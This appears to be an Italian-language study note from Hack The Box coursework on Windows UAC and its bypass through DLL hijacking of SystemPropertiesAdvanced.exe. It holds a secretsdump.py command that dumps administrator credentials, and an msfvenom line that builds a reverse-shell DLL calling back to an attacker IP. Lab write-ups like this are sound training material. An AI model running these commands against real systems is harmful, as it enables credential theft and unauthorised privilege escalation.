`j4k1dibe@htb[/htb]$ secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator`

# UAC User Access Control
Le applicazioni hanno diversi integrity levels. e un programma con alti integrity level puo' fare azioni che possono compromettere il sistema.

UAC e' una feature che abilita un prompt di consenso per attivita' che richiedono certi privilegi.

When a standard user attempts to run an app that requires an administrator access token, UAC requires that the user provides valid administrator credentials.

Quando UAC e' abilitato le applicazioni e le task runnano sempre come non amministratore a meno che un amministratore permetta esplicitamente alle applicazioni di eseguire con permessi da administrator.

E' una feature conveniente che previene cambiamenti non voluti daglia admin ma **NON E' UN SECURITY BOUNDARY**.

UAC puo' dare piu' access rights al Token di un  applicazione

The default RID 500 administrator account always operates at the high mandatory level. With Admin Approval Mode (AAM) enabled, any new admin accounts we create will operate at the medium mandatory level by default and be assigned two separate access tokens upon logging in. In the example below, the user account sarah is in the administrators group, but cmd.exe is currently running in the context of their unprivileged access token.

### Confirming UAC is Encabled
`C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA`

### Checking UAC Level
`C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin`

## Bypassing UAC

Bypassare UAC dipende molto dalla versione di windows installata.

`PS C:\htb> [environment]::OSVersion.Version` con questo comando vediamo la Build del nostro Windows.

da questa pagina possiamo vedere a quale release appartiene: https://en.wikipedia.org/wiki/Windows_10_version_history

**UACME** (https://github.com/hfiref0x/UACME) mantiene una lista di UAC BYpass in base alle varie Build di Windows e se windows ha fatto security updates.

Molto spesso sfruttano eseguibili che windows permette di autoelevarsi come ad esempio SystemPropertiesAdvanced.exe. (che cerca una Dll che non esiste e possiamo fare Dll Hijacking).

Quando windows carica una Dll fa questo ordine:

1) The directory from which the application loaded.
2) The system directory C:\Windows\System32 for 64-bit systems.
3) The 16-bit system directory C:\Windows\System (not supported on 64-bit systems)
4) The Windows directory.
5) Any directories that are listed in the PATH environment variable.

### Printa la PATH env var
`PS C:\htb> cmd /c echo %PATH%`

### Generiamo una Dll che carichera' quell'exe li'
`j4k1dibe@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll`

### Eseguiamo SystemPropertiesAdvanced
`C:\htb> C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe`
